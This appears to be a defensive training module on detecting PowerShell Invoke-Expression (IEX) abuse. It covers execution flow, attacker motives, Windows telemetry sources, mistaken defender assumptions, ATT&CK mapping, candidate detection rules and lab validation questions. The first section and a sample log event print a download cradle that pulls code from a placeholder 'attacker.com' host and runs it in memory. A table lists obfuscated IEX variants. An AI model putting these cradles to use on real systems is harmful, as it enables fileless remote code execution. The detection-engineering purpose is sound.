# Invoke-Expression (IEX) Abuse Validation

**Mission Question:** Can we detect Invoke-Expression abuse reliably, or are we matching a string and calling it coverage?

## Table of Contents

1. [How Does the Technique Work?](#1-how-does-the-technique-work)  
2. [Why Do Attackers Use It?](#2-why-do-attackers-use-it)  
3. [What Telemetry Is Generated?](#3-what-telemetry-is-generated)  
4. [What Assumptions Do Defenders Make?](#4-what-assumptions-do-defenders-make)  
5. [ATT\&CK Mapping](#5-attck-mapping)  
6. [Telemetry Inventory](#6-telemetry-inventory)  
7. [Detection Opportunities](#7-detection-opportunities)  
8. [Validation Questions](#8-validation-questions)

## 1\. How Does the Technique Work?

### Core Execution Flow

`Invoke-Expression` (alias: `IEX`) is a built-in PowerShell cmdlet that takes a string and executes it as PowerShell code. It is functionally equivalent to `eval()` in other languages — anything that resolves to a string can be executed.

**Basic usage example:**

\# Direct string execution

Invoke-Expression "Write-Host 'Hello BlueTeam'"

\# Alias form

IEX "Write-Host 'Hello BlueTeam'"

\# From a variable

$payload \= "Write-Host 'Hello BlueTeam'"

IEX $payload

\# Download cradle — the most common malicious pattern

IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

\# Pipe form

"Write-Host 'Hello BlueTeam'" | IEX

**Full execution flow (download cradle pattern):**

Attacker hosts payload on remote server

        ↓

Victim machine: Net.WebClient.DownloadString() retrieves payload string

        ↓

String passed directly to Invoke-Expression / IEX

        ↓

PowerShell runtime executes string as code in current process context

        ↓

No script file written to disk

        ↓

Payload executes in memory — may spawn children, beacon to C2, etc.

### Common Obfuscated Variants

| Variant | Example |
| :---- | :---- |
| Direct alias | `IEX "..."` |
| Full cmdlet | `Invoke-Expression "..."` |
| Pipe form | `"..." | IEX` |
| Variable intermediate | `$x = "..."; IEX $x` |
| String concatenation | `IEX ("Write" + "-Host 'test'")` |
| Decoded from Base64 | `IEX ([System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($enc)))` |
| ScriptBlock form | `&([scriptblock]::Create("Write-Host 'test'"))` |
| Nested with DownloadString | `IEX (iwr 'http://...').Content` |

⚠️ **Key point:** None of these forms look the same to a string-matching parser. A rule matching only `IEX` misses most of the above variants.

### Parent-Child Process Relationships

IEX itself does not spawn a child process — it executes within the current PowerShell session. This is what makes it harder to detect than `-EncodedCommand`. The process creation telemetry shows `powershell.exe` launching; IEX activity appears only in script block logs or behavioral telemetry.

Unless the executed payload spawns a child process, process-based detection alone is insufficient.

## 2\. Why Do Attackers Use It?

### In-Memory Execution

The most powerful property of IEX is that it executes code that never touches disk as a file. A payload retrieved via `DownloadString` exists only as a string in memory — no hash, no file path, no AV scan opportunity on write.

### Flexible Payload Delivery

IEX is source-agnostic. The string being executed can come from:

- A hardcoded string in the script  
- A variable built through concatenation  
- A Base64-decoded blob  
- A remotely retrieved file  
- A registry value  
- A network socket read

This flexibility makes it composable with almost any other evasion technique.

### Obfuscation Support

Because IEX simply takes a string, the payload can be obfuscated at the string level before being passed. The obfuscation does not need to survive parsing — it only needs to survive the SIEM. By the time PowerShell actually executes, the content is already in memory.

### Popularity Among Threat Actors

| Threat Actor / Tool | Known IEX Usage |
| :---- | :---- |
| Cobalt Strike | Default PowerShell stager uses IEX \+ download cradle |
| PowerShell Empire | Core execution primitive |
| Emotet | Staged PowerShell payloads |
| APT29 / Cozy Bear | Documented use of download cradles with IEX |
| Living-off-the-land campaigns | IEX paired with LOLBAS for delivery |

## 3\. What Telemetry Is Generated?

### PowerShell Script Block Logging — Event ID 4104 ⭐

This is the primary detection surface for IEX. When enabled, EID 4104 logs every script block before execution — including the content being passed to IEX, regardless of how it was assembled or obfuscated.

**What a 4104 event shows for IEX:**

EventID: 4104

ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

Path:

MessageNumber: 1

MessageTotal: 1

If the downloaded payload is also executed via PowerShell, a second 4104 event fires for the payload content itself.

⚠️ **Gap:** EID 4104 requires script block logging to be enabled via GPO. It is **off by default**. Many environments have module logging (EID 4103\) enabled without script block logging.

GPO path:

Computer Configuration → Administrative Templates →

Windows Components → Windows PowerShell →

Turn on PowerShell Script Block Logging → Enabled

### Sysmon Event ID 1 — Process Creation

Captures the `powershell.exe` invocation and its command-line arguments. Useful for detecting the parent process and any flags (e.g., `-NonInteractive`, `-WindowStyle Hidden`, `-NoProfile`).

However: if the attacker launches PowerShell without explicit IEX in the command-line argument (e.g., the IEX call is inside a script file or retrieved remotely), EID 1 alone will not reveal the IEX usage.

⚠️ **Gap:** Sysmon requires deployment and a config that includes process creation. Not present in all environments.

### Windows Security Log — Event ID 4688

Process creation event. Same limitation as Sysmon EID 1 — useful for the PowerShell invocation, not for IEX activity within the session.

⚠️ **Gap:** Command-line capture for 4688 requires explicit Group Policy configuration. Disabled by default.

### AMSI — Antimalware Scan Interface

AMSI intercepts PowerShell content before execution and passes it to the registered security product. Critically, AMSI sees the **decoded, deobfuscated content** that IEX is about to execute — not the obfuscated input string.

This makes AMSI a strong detection surface — when it is properly integrated and not bypassed.

⚠️ **Gap:** AMSI integration depends on the security product. AMSI bypass techniques exist and are widely documented (see Week 5).

### Network Telemetry

When IEX is paired with a download cradle, the following network artifacts are generated:

- DNS query for the attacker domain  
- HTTP or HTTPS GET request from `powershell.exe`  
- Proxy logs if egress is routed through a proxy

✅ **Advantage:** Network telemetry is often more consistently collected than endpoint script logging. A DNS query from `powershell.exe` to an unknown external host is a high-signal indicator even without content visibility.

### EDR Behavioral Telemetry

Modern EDRs may detect IEX via:

- PowerShell process behavior monitoring  
- Memory scanning for known payload patterns  
- API call telemetry for network connections originating from `powershell.exe`  
- Script content inspection via AMSI integration

⚠️ **Gap:** EDR visibility does not automatically mean the SIEM receives usable, normalized fields. The pipeline from EDR agent → EDR backend → SIEM connector → normalized index must be validated end to end.

## 4\. What Assumptions Do Defenders Make?

| Assumption | Reality |
| :---- | :---- |
| "We alert on IEX" | A string match on `IEX` misses `Invoke-Expression`, pipe syntax, variable-passed strings, and all concatenated/decoded variants |
| "PowerShell logging is enabled" | Module logging (EID 4103\) and script block logging (EID 4104\) are different settings. EID 4104 is off by default and is the one that matters for IEX |
| "Our EDR sees PowerShell" | The EDR agent may observe the activity; the SIEM may not receive a normalized, searchable field containing the script block content |
| "We blocked \-EncodedCommand, so PowerShell abuse is handled" | IEX does not require Base64 encoding. Blocking `-EncodedCommand` does not close the IEX gap |
| "We have the logs" | Having raw logs, having a searchable index, and having an alerting rule on the right field are three separate operational problems |
| "AMSI covers it" | AMSI can be bypassed (covered in Week 5\) and depends on security product integration quality |
| "The analyst would catch unusual PowerShell" | Without a specific alert, PowerShell activity is rarely triaged proactively in high-volume SOC environments |

## 5\. ATT\&CK Mapping

| Field | Value |
| :---- | :---- |
| **Tactic** | Execution, Defense Evasion |
| **Technique** | T1059.001 — Command and Scripting Interpreter: PowerShell |
| **Related** | T1105 — Ingress Tool Transfer (download cradle pattern) |
| **Related** | T1027 — Obfuscated Files or Information (concatenation/decode variants) |
| **Platform** | Windows |
| **Data Sources** | Script: Script Execution, Process: Process Creation, Network Traffic: Network Connection Creation |

## 6\. Telemetry Inventory

| Data Source | Event ID | What It Captures | Default Enabled? | Notes |
| :---- | :---- | :---- | :---- | :---- |
| PowerShell Script Block Logging | EID 4104 | Decoded script block content including IEX argument | **No** | Most important source — requires GPO |
| PowerShell Module Logging | EID 4103 | Pipeline execution output | No | Does NOT capture script block content |
| Sysmon Process Creation | EID 1 | Process launch with command-line args | No | Requires Sysmon deployment |
| Windows Security | EID 4688 | Process creation (limited without config) | Partial | Requires cmd-line GPO setting |
| AMSI | Vendor-dependent | Decoded content before execution | Yes (if product integrated) | Bypassable — see Week 5 |
| Network / DNS / Proxy | N/A | Outbound connections from powershell.exe | Varies | High signal when present |
| EDR Behavioral | Vendor-dependent | Process behavior, API calls, memory | Depends on policy | Does not guarantee SIEM field delivery |

## 7\. Detection Opportunities

### High Confidence

PowerShell EID 4104

\+ ScriptBlockText contains: IEX | Invoke-Expression | DownloadString | iwr | Invoke-WebRequest

\+ ScriptBlockText length \> 200 characters

### Medium Confidence

powershell.exe process creation (Sysmon EID 1 or EID 4688\)

\+ CommandLine contains: \-NoProfile \-NonInteractive \-WindowStyle Hidden

\+ ParentImage is: winword.exe, excel.exe, mshta.exe, wscript.exe, cscript.exe, cmd.exe

### Network-Based

Network connection from powershell.exe

\+ Destination is external (non-RFC1918)

\+ Protocol: DNS query to previously unseen domain

\+ OR HTTP GET to .ps1 file path

### Behavioral Baseline Deviation

Host-level frequency of PowerShell network connections per day

\> 2 standard deviations from 30-day rolling baseline

**Reminder:** These are detection logic candidates, not production rules. Each must be lab-validated before deployment.

## 8\. Validation Questions

Answer these before closing Week 2:

- [ ] Is **script block logging** (EID 4104\) enabled via GPO? Verify it applies to the correct OUs — not just the policy object existing.  
- [ ] Run a test: execute `IEX "Write-Host 'DetectionHunter'"` in your lab environment. Did EID 4104 fire? What field contained the content?  
- [ ] Run a test with a **concatenated form**: `$a = "Write-H"; $b = "ost 'test'"; IEX ($a + $b)` — does the same 4104 fire? Does the full assembled string appear?  
- [ ] Does your SIEM have a rule targeting the **ScriptBlockText field** specifically? Or does it target command-line arguments only?  
- [ ] If your EDR captures this activity, verify: does that field appear in your SIEM index? Is it normalized? Is it searchable?  
- [ ] Execute a download cradle test to an internal test server: does **network telemetry** from `powershell.exe` appear in your proxy or DNS logs?  
- [ ] Can you distinguish between a rule that **fires** and a rule that is **configured but never fires**? When did your IEX-related alert last trigger?

